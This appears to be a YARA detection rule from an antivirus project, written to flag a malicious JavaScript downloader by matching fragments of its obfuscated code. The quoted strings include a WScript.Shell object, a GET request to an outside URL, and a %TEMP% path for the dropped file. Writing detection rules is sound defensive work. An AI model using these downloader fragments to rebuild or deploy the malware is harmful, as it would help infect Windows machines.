rule sig_20160427_bb55d8231e58494825f112cfc7a10d03 {
  meta:
    description = "datamaliciousorder - file 20160427_bb55d8231e58494825f112cfc7a10d03.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7b80f6683777b30f4e0d1125cdc0d2dc3618edda67019f61662eb74036dd6cc6"

  strings:
    $s1  = "var WgordDkpkk = function WcmxfScjnm() {return BdnrpSroas[VfffhMyhky](\"WScript\"+\".Shell\");}(), EtrncPlsdo = 11;" fullword ascii
    $s2  = "function BylwnExhai(OwalhWlxpg, LfpnmJxive){MfembMwadz = MfembMwadz * 1; return OwalhWlxpg - LfpnmJxive;};" fullword ascii
    $s3  = "LbepuVwjin[BmmshSahtu](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s4  = "var BdnrpSroas = this[\"WScript\"];" fullword ascii
    $s5  = "function NnqzwZiofl() {return WgordDkpkk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"dy9YmCa" ascii
    $s6  = "function NnqzwZiofl() {return WgordDkpkk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"dy9YmCa" ascii
    $s7  = "function YttvtOpeiy(){return XdjwpFnryd + \"\";};" fullword ascii
    $s8  = "if (LbepuVwjin[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ZqvkrLtkdv() {return ((JkdroVdimh == true) && (JkdroVdimh == RauknTfeby)) ? 1 : MfembMwadz;};" fullword ascii
    $s10 = "RauknTfeby = true; " fullword ascii
    $s11 = "function EngzoJkivf(){return VfffhMyhky;};" fullword ascii
    $s12 = "}while (LffjjHjrlb);" fullword ascii
    $s13 = "var RauknTfeby = false;" fullword ascii
    $s14 = "function NtzidQmjxj()" fullword ascii
    $s15 = "var UmwqhBytui = false;" fullword ascii
    $s16 = "var ZdzcjKmwya = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var JkdroVdimh = false;" fullword ascii
    $s18 = "function JkyxzXgixu(HhmopLgnmo) {var OuwopIcnag = (1, 2, 3, 4, 5, HhmopLgnmo); return OuwopIcnag;};" fullword ascii
    $s19 = "function WewkaYyeyv(){return 23;};" fullword ascii
    $s20 = "UmwqhBytui = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}